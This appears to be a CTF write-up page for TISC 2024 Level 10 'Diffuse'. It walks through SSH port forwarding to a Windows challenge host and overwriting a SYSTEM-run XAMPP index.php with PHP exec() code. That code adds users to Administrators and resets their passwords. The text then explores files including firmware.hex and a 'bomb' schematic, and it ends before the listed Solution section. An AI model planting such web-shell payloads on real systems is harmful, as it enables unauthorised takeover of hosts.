
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../level-09/">
      
      
      
      <link rel="icon" href="/assets/logo.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.39">
    
    
      
        <title>Level 10 - Diffuse - CTF</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.8c3ca2c6.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#level-10-diffuse" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="CTF" class="md-header__button md-logo" aria-label="CTF" data-md-component="logo">
      
  <img src="/assets/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CTF
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Level 10 - Diffuse
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="teal"  aria-hidden="true"  type="radio" name="__palette" id="__palette_1">
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_3" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_3">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_4" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_4">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="CTF" class="md-nav__button md-logo" aria-label="CTF" data-md-component="logo">
      
  <img src="/assets/logo.png" alt="logo">

    </a>
    CTF
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  <span class="md-ellipsis">
    2023
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            2023
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/bsides-algiers/forensics-strom/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Bsides algiers
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/cyberhavoc/crypto-the-beginning-of-all/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Cyberhavoc
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/grey-ctf/misc-crashpython/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Grey ctf
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/hero-ctf/misc-irreductible/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Hero ctf
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/icsjwg-ctf/celistic-dropping-boms-1/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Icsjwg ctf
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/plaid-ctt/rev-buried-treasure/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Plaid ctt
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/punksecurity-ctf/gtfobins-2/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Punksecurity ctf
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/san-diego-ctf/crypto-jumbled-snake/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    San diego ctf
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/space-heroes-ctf/crypto-rick-sanchez-algorithm/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Space heroes ctf
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/tamu-ctf/misc-gamer-redux/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Tamu ctf
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    
  
  
    <a href="../../../2023/tjctf/crypto-baby-rsa/" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Tjctf
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

  

      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    2024
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            2024
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
    
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    TISC
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            TISC
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 01 - Navigating the Digital Labyrinth
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 02 - Language, Labyrinth and (Graphics)Magick
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 03 - Digging Up History
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 04 - AlligatorPay
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 05 - Hardware isnt that Hard!
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 06 - Meownitoring
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 07 - WebAsmLite
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 08 - Wallfacer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../level-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 09 - Imphash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Level 10 - Diffuse
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Level 10 - Diffuse
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#information-gathering-and-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Information Gathering and Privilege Escalation
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#information-gathering-via-diffuse-user" class="md-nav__link">
    <span class="md-ellipsis">
      Information Gathering via diffuse User
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#firmware-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Firmware Analysis
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      Solution
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#information-gathering-and-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Information Gathering and Privilege Escalation
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#information-gathering-via-diffuse-user" class="md-nav__link">
    <span class="md-ellipsis">
      Information Gathering via diffuse User
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#firmware-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Firmware Analysis
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      Solution
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="level-10-diffuse">Level 10 - Diffuse</h1>
<p><img alt="" src="../assets/level-10-chall-desc.png" /></p>
<h2 id="information-gathering-and-privilege-escalation">Information Gathering and Privilege Escalation</h2>
<p>Based on the challenge description, I can interact with my own Level 10 instance via the Telegram bot with the handle <code>@DiffuseInstanceBot</code>. By sending my platform username followed by the level password, the bot provides the SSH credentials to connect to the challenge instance:</p>
<p><img alt="" src="../assets/level-10-telebot.png" /></p>
<p>After connecting, I gained access to a Windows environment:</p>
<p><img alt="" src="../assets/level-10-initial-ssh.png" /></p>
<p>It appears that the RDP port is open:</p>
<p><img alt="" src="../assets/level-10-rdp.png" /></p>
<p>To make the information gathering process more manageable, I can attempt to forward the RDP port through SSH and then use RDP to access the instance for further analysis:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>ssh -L 3389:127.0.0.1:3389 diffuser@20.212.177.135 -N
</span></code></pre></div></td></tr></table></div>
<p>Once the port forwarding is set up, I can connect to the Windows environment using Remmina through <code>127.0.0.1:3389</code>:</p>
<p><img alt="" src="../assets/level-10-remmina.png" /></p>
<p>After performing basic enumeration, I discovered the <code>diffuse</code> home directory, but the current user does not have sufficient privileges to list its contents.</p>
<p><img alt="" src="../assets/level-10-no-diffuse-access.png" /></p>
<p>Additionally, a <code>xampp</code> directory was also found, located in <code>C:\</code>. However, the current user also lacks the necessary permissions to list its contents, which likely includes web source code.</p>
<p><img alt="" src="../assets/level-10-no-xampp-access.png" /></p>
<p>We can perform a simple curl request to <code>http://127.0.0.1</code> to download the index page. From the downloaded page, we can see that PHP is being used.</p>
<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;submit.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>Since PHP is being used, I assumed the index page likely has a <code>.php</code> extension, meaning an <code>index.php</code> file probably exists.</p>
<p>Despite the restrictions on accessing the <code>xampp</code> directory, files within <code>C:\xampp\htdocs\</code>, which includes as <code>index.php</code>, can be overwritten. I created an <code>index.php</code> file to execute the <code>whoami</code> command and overwrite the existing <code>index.php</code> file.</p>
<p>Here is the code:</p>
<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
<span class="normal"><a href="#__codelineno-2-2">2</a></span>
<span class="normal"><a href="#__codelineno-2-3">3</a></span>
<span class="normal"><a href="#__codelineno-2-4">4</a></span>
<span class="normal"><a href="#__codelineno-2-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="cp">&lt;?php</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">);</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="cp">?&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../assets/level-10-overwrite-php-index1.png" /></p>
<p>Making a HTTP request to the modified <code>index.php</code> returns a response showing <code>NT AUTHORITY/SYSTEM</code> as the executing user:</p>
<p><img alt="" src="../assets/level-10-privileged-web.png" /></p>
<p>At this point, we can escalate privileges by updating the <code>index.php</code> to add <code>diffuse</code> and <code>diffuser</code> to the <code>Administrators</code> group and assign them a simple password.</p>
<p>Here is the code:</p>
<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
<span class="normal"><a href="#__codelineno-3-2">2</a></span>
<span class="normal"><a href="#__codelineno-3-3">3</a></span>
<span class="normal"><a href="#__codelineno-3-4">4</a></span>
<span class="normal"><a href="#__codelineno-3-5">5</a></span>
<span class="normal"><a href="#__codelineno-3-6">6</a></span>
<span class="normal"><a href="#__codelineno-3-7">7</a></span>
<span class="normal"><a href="#__codelineno-3-8">8</a></span>
<span class="normal"><a href="#__codelineno-3-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="cp">&lt;?php</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">);</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;net localgroup Administrators diffuse /add&quot;</span><span class="p">);</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;net localgroup Administrators diffuser /add&quot;</span><span class="p">);</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;net user diffuse pass&quot;</span><span class="p">);</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;net user diffuser pass&quot;</span><span class="p">);</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="cp">?&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../assets/level-10-overwrite-php-index2.png" /></p>
<h2 id="information-gathering-via-diffuse-user">Information Gathering via <code>diffuse</code> User</h2>
<p>During my time exploring as <code>diffuse</code>, I went down several rabbit holes trying to figure out where to find the contents of a few powershell scripts (<code>setup.ps1</code>, and <code>setupv2.ps1</code>) that were referenced in <code>Setup.ps1</code> which can be found within one of his directories. I also found references to <code>arduino_bomb_for_participants.zip</code> in the <code>Recycle Bin</code>... However, the files in the Recycle Bin seems corrupted...</p>
<p>While exploring as <code>diffuse</code>, I went down several rabbit holes trying to locate the contents of a few PowerShell scripts (<code>setup.ps1</code> and <code>setupv2.ps1</code>) that were referenced in <code>Setup.ps1</code>, which I found within one of his directories. Additionally, I found references to <code>arduino_bomb_for_participants.zip</code> in the Recycle Bin. However, the files in the <code>Recycle Bin</code> appear to be corrupted:</p>
<p><img alt="" src="../assets/level-10-recycle-bin.png" /></p>
<p>Thinking level 10 was a forensics challenge, I went to install numerous forensic analysis tools in an attempt to carve out the deleted files.</p>
<p>However, there were several interesting files in the <code>AppData</code> and <code>Desktop</code> directories of the <code>diffuse</code> user. After much exploration, the most crucial file for solving this challenge had been in clear sight all along: <code>firmware.hex</code>, located in <code>C:\Users\diffuse\Desktop\project_incendiary</code>. The content of this file is in Intel HEX format.</p>
<p><img alt="" src="../assets/level-10-firmware-hex.png" /></p>
<p>Additionally, I discovered a hidden directory at <code>C:\Users\diffuse\AppData\Roaming\Icendiary\Schematics\</code> containing a file named <code>schematic.pdf</code>. Upon opening the file, it revealed the schematic of an Arduino-based bomb:</p>
<p><img alt="" src="../assets/level-10-schematics-pdf.png" /></p>
